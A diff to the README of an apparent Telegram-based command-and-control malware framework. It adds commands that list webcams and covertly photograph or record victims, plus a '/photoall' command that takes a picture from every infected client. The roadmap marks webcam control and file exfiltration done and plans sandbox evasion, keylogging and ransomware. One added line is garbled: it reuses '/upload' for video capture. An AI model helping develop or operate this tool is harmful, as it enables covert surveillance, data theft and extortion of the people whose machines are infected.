@@ -43,11 +43,15 @@
 - `/kill` – Delete the client thread
 - `/download <file path>` – Download a file from the agent
 - `/upload <file path>` – Upload a file to the agent
+- `/listwebcams` – Return the index of available cameras
+- `/photo <camera index>` – Take Photo from the webcam
+- `/upload <file path>` – Takes a video from the webcam
 
 ### In the main thread (global)
 - `/sendall <command>` – Execute command on all clients
 - `/statusall` – Check connection status for all clients
 - `/shutdown` – Gracefully shut down the C2 server
+- `/photoall` – Takes a photo from default webcam  of the allclients
 
 ---
 
@@ -60,6 +64,9 @@
   - `mss`
   - `Pillow`
   - `sqlite3` (built-in)
+  - `pillow`
+  - `termcolor`
+  - `opencv-python`
 - A Telegram bot token
 - A Telegram group with **forum topics** enabled
 
@@ -75,12 +82,11 @@
 - [ ] Tagging/grouping system for bots (e.g. by OS, location)
 - [ ] Basic anti-debug & evasion in agent (sandbox, VM detection)
 - [ ] Cross-platform agent (Windows, Linux, MacOS)
-- [ ] Webcam control
+- [x] Webcam control
 - [x] File exfiltration (`/upload`, `/download`)
 - [ ] Keylogging and ransomware included on the agent
 - [ ] Alternate C2 channels (Discord, HTTP over CDN, direct Telegram API)
 - [ ] Optional web dashboard (clients list, commands, status, etc.)
-- [ ] Runtime plugin loading (dynamic agent modules)
 
 ---
 
